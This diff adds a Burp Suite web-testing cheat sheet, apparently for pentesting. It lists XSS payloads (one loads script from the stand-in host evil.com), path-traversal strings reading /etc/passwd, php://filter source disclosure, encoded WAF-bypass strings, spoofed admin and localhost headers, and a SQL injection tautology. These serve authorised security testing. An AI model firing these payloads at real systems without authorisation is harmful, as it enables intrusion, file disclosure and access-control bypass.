@@ -1,0 +1,73 @@
+## 🕵️ Recon
+- Use HTTP History to gather URLs, params
+- Use Param Miner (Extension) to discover hidden parameters
+- Use Logger++ to track all requests
+
+## 🔍 Parameter Discovery
+- Extension: Param Miner
+- Tool: Arjun (CLI)
+
+## ⚙️ Intruder (XSS Example)
+- Target param: ?q=abc
+- Payloads:
+    "><script>alert(1)</script>
+    <img src=x onerror=alert(1)>
+    <svg/onload=alert(1)>
+    <script src=//evil.com></script>
+
+- Grep Match:
+    alert(1)
+    onerror
+    <script
+
+## 📁 LFI Testing
+- Payloads:
+    ../../../../etc/passwd
+    ..%2f..%2fetc%2fpasswd
+    php://filter/convert.base64-encode/resource=index.php
+
+- Grep Match:
+    root:x
+    <!DOCTYPE
+
+## 🎭 WAF Bypass
+- Encoded payloads:
+    %3Cscript%3Ealert(1)%3C%2Fscript%3E
+    ..%252f..%252fetc%252fpasswd
+
+- Headers:
+    X-Original-URL: /admin
+    X-Forwarded-For: 127.0.0.1
+
+## 🧪 Extensions
+- Param Miner (hidden parameters)
+- Logger++
+- Turbo Intruder (fast fuzzing)
+- JS Miner (analyze JS)
+- Autorize (auth bypass)
+
+## 🔐 Authorization
+- Autorize: Replay requests with low-priv token
+- Detect IDOR/missing access control
+
+## 🗂️ Filters (HTTP History)
+- method:POST
+- mime-type:HTML
+- status:302
+- extension:php
+
+## 🎯 Wordlists (for Intruder)
+LFI:
+    /etc/passwd
+    php://filter
+XSS:
+    <img src=x onerror=alert(1)>
+    <svg/onload=alert(1)>
+SQLi:
+    ' OR 1=1--
+Auth bypass:
+    X-Forwarded-For: 127.0.0.1
+
+# ✅ Final Tip:
+Manual analysis > Automated scanning.
+Explore behavior, test logic, and repeat.
